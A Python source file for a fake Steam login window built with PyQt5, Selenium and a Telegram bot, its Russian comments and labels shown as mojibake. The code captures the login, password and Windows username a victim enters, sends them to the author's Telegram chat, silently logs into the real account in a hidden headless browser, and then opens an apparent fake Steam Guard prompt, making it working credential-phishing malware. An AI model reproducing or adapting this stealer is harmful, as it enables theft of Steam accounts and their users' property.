import sys, config, send
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QPainter, QColor, QPen, QFont
from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton
from os import system
from time import sleep
from requests import get
from subprocess import CREATE_NO_WINDOW
from getpass import getuser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from telebot import TeleBot
from webdriver_manager.chrome import ChromeDriverManager

import win32gui

def hide_window_by_name(process_name):
    def enum_windows_callback(hwnd, process_name):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ –æ–∫–Ω–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É
        if process_name in win32gui.GetWindowText(hwnd):
            # –°–∫—Ä—ã–≤–∞–µ–º –æ–∫–Ω–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
            win32gui.ShowWindow(hwnd, 0)  # 0 - SW_HIDE

    # –û–±—Ö–æ–¥–∏–º –≤—Å–µ –æ–∫–Ω–∞
    win32gui.EnumWindows(enum_windows_callback, process_name)

class LoginThread(QThread):
    login_completed = pyqtSignal()

    def __init__(self, login, password, driver):
        super().__init__()
        self.login = login
        self.password = password
        self.driver = driver

    def run(self):

        self.driver.get('https://store.steampowered.com/login/')

        username_input = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[1]/input')))
        password_input = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[2]/input')))

        username_input.send_keys(self.login)
        password_input.send_keys(self.password)

        log_in = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[4]/button')))
        log_in.click()

        try:
            invalid = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[5]')))
            print(invalid.text)
        except Exception as er:
            print(er)
        
        sleep(5)
        self.login_completed.emit()

class SteamApp(QWidget):
    def __init__(self):
        super().__init__()

        self.op = webdriver.ChromeOptions()
        self.op.add_argument("--window-size=1920,1080")
        self.op.add_argument("--start-maximized")
        self.op.add_argument("--disable-extensions") 
        self.op.headless = True
        self.serv = ChromeService(ChromeDriverManager().install())
        self.serv.creationflags = CREATE_NO_WINDOW
        self.driver = webdriver.Chrome(service=self.serv, options=self.op)

        hide_window_by_name('chromedriver.exe')

        # –ó–∞–≥—Ä—É–∑–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        response = get('https://sun9-76.userapi.com/impg/Y90D-R1YvR0by1kpPajRKIP70lelCmiX4bHP-g/Z-bxFag3Bq8.jpg?size=706x434&quality=96&sign=1abc3453d771f7a7e946652e5926993c&type=album')
        image_data = response.content

        # –°–æ–∑–¥–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–∞ QPixmap –∏–∑ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)

        # –ü—Ä–∏—Å–≤–æ–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ QPixmap –∞—Ç—Ä–∏–±—É—Ç—É background
        self.background = pixmap

        self.label = QLabel(self)
        self.label.setPixmap(self.background)

        # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä —à—Ä–∏—Ñ—Ç–∞ Arial
        font = QFont("Arial")

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∏–ª—å –¥–ª—è –≤—Å–µ–≥–æ –≤–∏–¥–∂–µ—Ç–∞
        self.setStyleSheet("QWidget { font-family: Arial; }")

        # –ó–∞–¥–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –∏ —Ä–∞–∑–º–µ—Ä—ã –æ–∫–Ω–∞
        self.setGeometry(100, 100, self.background.width(), self.background.height())

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∏–ª—å –æ–∫–Ω–∞ –±–µ–∑ —Ä–∞–º–∫–∏
        self.setWindowFlags(Qt.FramelessWindowHint)

        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –º—ã—à–∏
        self.label.mousePressEvent = self.mouse_press_event
        self.label.mouseMoveEvent = self.mouse_move_event

        self.drag_position = None

        # –ò–Ω–∏—Ü–∏–ª–∏–∑–∏—Ä—É–µ–º –±–æ—Ç–∞ Telegram
        self.bot = TeleBot(config.token)

        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É –ª–æ–≥–∏–Ω–∞
        self.login_input = QLineEdit(self)
        self.login_input.setGeometry(35, 125, 394, 44)
        self.login_input.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 14px;
            }
            QLineEdit:hover {
                background-color: #393c44;
            }
        """)
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É –ø–∞—Ä–æ–ª—è
        self.password_input = QLineEdit(self)
        self.password_input.setGeometry(35, 203, 394, 44)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 14px;
            }
            QLineEdit:hover {
                background-color: #393c44;
            }
        """)

        # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É "–í–æ–π—Ç–∏"
        self.login_button = QPushButton("–í–æ–π—Ç–∏", self)
        self.login_button.setGeometry(92, 290, 283, 58)
        self.login_button.clicked.connect(self.login)
        self.login_button.setStyleSheet("""
            QPushButton {
                background-color: #0fadff;
                border: 1px solid #565a5f;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 18px;
            }
            QPushButton:hover {
                background-color: #4dbdff;
            }
        """)

        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
        self.help = QLabel("–ü–æ–º–æ–≥–∏—Ç–µ, —è –Ω–µ –º–æ–≥—É –≤–æ–π—Ç–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç", self)
        self.help.setGeometry(30, 400, 800, 30)
        self.help.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            text-decoration: underline;
            cursor: arrow;
        """)
        self.help.mousePressEvent = self.help_clicked

        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
        self.reg = QLabel("–ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞ Steam? –°–æ–∑–¥–∞–π—Ç–µ –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç", self)
        self.reg.setGeometry(350, 400, 800, 30)
        self.reg.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            text-decoration: underline;
            cursor: arrow;
        """)
        self.reg.mousePressEvent = self.create_clicked

    def send_message(self, message):
        self.bot.send_message(config.my_id, message)

    def help_clicked(self, event):
        system('start https://help.steampowered.com/ru/wizard/HelpWithLogin?redir=clientlogin')

    def create_clicked(self, event):
        system('start https://store.steampowered.com/join/')

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.drawPixmap(self.rect(), self.background)

        # –†–∏—Å—É–µ–º –∑–∞–∫—Ä—É–≥–ª–µ–Ω–Ω—ã–µ —É–≥–ª—ã –∏ –±–µ–ª—É—é –æ–±–≤–æ–¥–∫—É
        painter.setPen(QPen(QColor(255, 255, 255), 2))
        painter.drawRoundedRect(self.login_input.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        painter.drawRoundedRect(self.password_input.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        painter.drawRoundedRect(self.login_button.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        
    def mouse_press_event(self, event):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ –∫–ª–∏–∫ –±—ã–ª —Å–¥–µ–ª–∞–Ω –≤ –≤–µ—Ä—Ö–Ω–µ–π —á–∞—Å—Ç–∏ –æ–∫–Ω–∞
        if event.y() <= 30:
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
        else:
            self.drag_position = None
        if event.button() == Qt.LeftButton and event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
    
    def mouse_move_event(self, event):
        if self.drag_position:
            self.move(event.globalPos() - self.drag_position)
    
    def close_app(self, event):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ –∫–ª–∏–∫ –±—ã–ª —Å–¥–µ–ª–∞–Ω –≤ –ø—Ä–∞–≤–æ–º –≤–µ—Ä—Ö–Ω–µ–º —É–≥–ª—É –æ–∫–Ω–∞
        if event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ

    def login(self):

        # –ü–æ–ª—É—á–∞–µ–º –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –ª–æ–≥–∏–Ω–∞ –∏ –ø–∞—Ä–æ–ª—è
        login = self.login_input.text()
        password = self.password_input.text()
        # –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∏–Ω–∞ –∏ –ø–∞—Ä–æ–ª—è
        self.send_message(f'''üî• –ù–æ–≤—ã–π –ª–æ–≥
üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {getuser()}
üë• –õ–æ–≥–∏–Ω: {login}
‚öô –ü–∞—Ä–æ–ª—å: {password}''')
        # Create and start the login thread
        self.login_thread = LoginThread(login, password, self.driver)
        self.login_thread.start()

        self.hide()
        send.steam_app = send.SteamGuard(login)
        send.steam_app.show()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    steam_app = SteamApp()
    steam_app.show()
    sys.exit(app.exec_())